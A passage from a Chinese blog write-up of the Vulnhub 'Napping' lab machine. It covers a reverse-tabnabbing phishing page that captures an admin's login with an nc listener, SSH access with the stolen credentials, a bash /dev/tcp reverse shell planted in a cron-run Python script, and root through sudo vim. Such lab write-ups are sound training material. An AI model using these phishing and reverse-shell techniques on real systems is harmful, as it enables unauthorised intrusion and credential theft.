class=\"hljs-string\"\u003e\"Login\"\u003c/span\u003e\u003e\n            \u0026#x3C;/div\u003e\n            \u0026#x3C;p\u003eDon\u003cspan class=\"hljs-string\"\u003e't have an account? \u0026#x3C;a href=\"register.php\"\u003eSign up now\u0026#x3C;/a\u003e.\u0026#x3C;/p\u003e\n        \u0026#x3C;/form\u003e\n    \u0026#x3C;/div\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e都放在\u003ccode\u003ekali\u003c/code\u003e的一个文件夹下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/diaoyu]\n└─\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\na.html  Login_files  Login.htm\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e使用\u003ccode\u003epython\u003c/code\u003e开启简易\u003ccode\u003eweb\u003c/code\u003e服务器（\u003ccode\u003e~/Desktop/test/diaoyu\u003c/code\u003e文件夹下）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython -m http.server \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后在页面上提交\u003ccode\u003ehttp://192.168.56.10/a.html\u003c/code\u003e ，随后等待管理员检查链接\u003c/p\u003e\n\u003cp\u003e简易服务器发现有人请求\u003ccode\u003ea.html\u003c/code\u003e了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython -m http.server \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\nServing HTTP on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e (http://\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/) ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e - - [\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/Nov/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:05] \u003cspan class=\"hljs-string\"\u003e\"GET /a.html HTTP/1.1\"\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看nc,得到用户凭证\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e43212\u003c/span\u003e\nPOST /login.htm HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nUser-Agent: python-requests/\u003cspan class=\"hljs-number\"\u003e2.22\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length: \u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: application/x-www-form-urlencoded\n\nusername=daniel\u0026#x26;password=C%40ughtm3napping123 \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获得shell\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e得到用户凭证后，尝试登录\u003ccode\u003essh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edaniel\nC@ughtm3napping123\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edaniel@napping:~$ whoami                                                                │┌──(root㉿kali)-[~/Desktop/test/diaoyu]\ndaniel                                                                                  │└─\u003cspan class=\"hljs-comment\"\u003e# python -m http.server 80\u003c/span\u003e\ndaniel@napping:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e                                                                    │Serving HTTP on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e (http://\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/) ...\nuid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(daniel) gid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(daniel) groups=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(daniel),\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(administrators)              │^C\ndaniel@napping:~$ uname -a                                                              │Keyboard interrupt received, exiting.\nLinux napping \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_6│                                                                                                         \u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e x86_64 GNU/Linux \n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esuid\u003c/code\u003e以及\u003ccode\u003esudo\u003c/code\u003e没有可利用的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找数据库配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edaniel@napping:/var/www/html$ cat config.php \n\u0026#x3C;?php\n/* Database credentials. Assuming you are running MySQL\nserver \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e default setting (user \u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e no password) */\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_SERVER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_USERNAME'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'adrian'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'P@sswr0d456'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_NAME'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'website'\u003c/span\u003e);\n \n/* Attempt to connect to MySQL database */\n$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n \n// Check connection\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($mysqli === false){\n    die(\u003cspan class=\"hljs-string\"\u003e\"ERROR: Could not connect. \"\u003c/span\u003e . $mysqli-\u003econnect_error);\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003eadrian\u003c/code\u003e 的账号密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试登录\u003ccode\u003eadrian\u003c/code\u003e 账户，无法登录\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录数据库查找敏感信息，没有可以用的信息\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e继续寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e知道存在\u003ccode\u003eadrian\u003c/code\u003e 用户，在\u003ccode\u003eadrian\u003c/code\u003e 的家目录存在\u003ccode\u003esite_status.txt\u003c/code\u003e ，我们拥有读权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# site_status.txt\u003c/span\u003e\n....\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e 09:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:01\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:02\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:02:01\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:04:01\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:06:01\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:08:01\nSite \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e Up: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:02\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一长串的类似的文本，应该是服务器启动时记录的，每两分钟一次，应该是有\u003ccode\u003ecron\u003c/code\u003e任务\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e同目录下还存在\u003ccode\u003equery.py\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e datetime \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e datetime\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e requests\n\nnow = datetime.now()\n\nr = requests.get(\u003cspan class=\"hljs-string\"\u003e'http://127.0.0.1/'\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e r.status_code == \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e:\n    f = \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"site_status.txt\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e)\n    dt_string = now.strftime(\u003cspan class=\"hljs-string\"\u003e\"%d/%m/%Y %H:%M:%S\"\u003c/span\u003e)\n    f.write(\u003cspan class=\"hljs-string\"\u003e\"Site is Up: \"\u003c/span\u003e)\n    f.write(dt_string)\n    f.write(\u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e)\n    f.close()\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n    f = \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"site_status.txt\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e)\n    dt_string = now.strftime(\u003cspan class=\"hljs-string\"\u003e\"%d/%m/%Y %H:%M:%S\"\u003c/span\u003e)\n    f.write(\u003cspan class=\"hljs-string\"\u003e\"Check Out Site: \"\u003c/span\u003e)\n    f.write(dt_string)\n    f.write(\u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e)\n    f.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得知\u003ccode\u003esite_status.txt\u003c/code\u003e 的内容时由该文件产生\u003c/p\u003e\n\u003cp\u003e查看权限，刚好我们也是\u003ccode\u003eadministrators\u003c/code\u003e的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edaniel@napping:/home/adrian$ ls -al query.py \n-rw-rw-r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e adrian administrators \u003cspan class=\"hljs-number\"\u003e481\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e query.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们拥有修改\u003ccode\u003equery.py\u003c/code\u003e 的权限，那就是拥有adrian用户的权限了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e修改\u003ccode\u003equery.py\u003c/code\u003e ,在顶部添加\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os;\nos.system(\u003cspan class=\"hljs-string\"\u003e\"bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.10/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e同时开启监听\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e等待执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                        \nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e43506\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e3289\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nadrian@napping:~$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得用户\u003ccode\u003eadrian\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e第一个flag文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eadrian@napping:~$ cat user.txt\nYou are nearly there!\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esudo -l\u003c/code\u003e ，K.O.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eadrian@napping:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e adrian on napping:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser adrian may run the following commands on napping:\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/vim\nadrian@napping:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003evim\u003c/code\u003e可以免密码以\u003ccode\u003eroot\u003c/code\u003e账号执行，故可以提权\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eadrian@napping:~$ sudo vim\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后在命令行模式下输入\u003ccode\u003e!/bin/bash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e:!/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得root！！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecat root.txt\nAdmins just can\u003cspan class=\"hljs-string\"\u003e't stay awake tsk tsk tsk\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学习到\u003ccode\u003eReverse_Tabnabbing\u003c/code\u003e的钓鱼攻击方式\u003c/p\u003e","title":"Vulnhub - Napping 1 0 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubNapping 1 0 1"},"buildId":"NScZb57d-O5AQ_AjxQ0ms","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>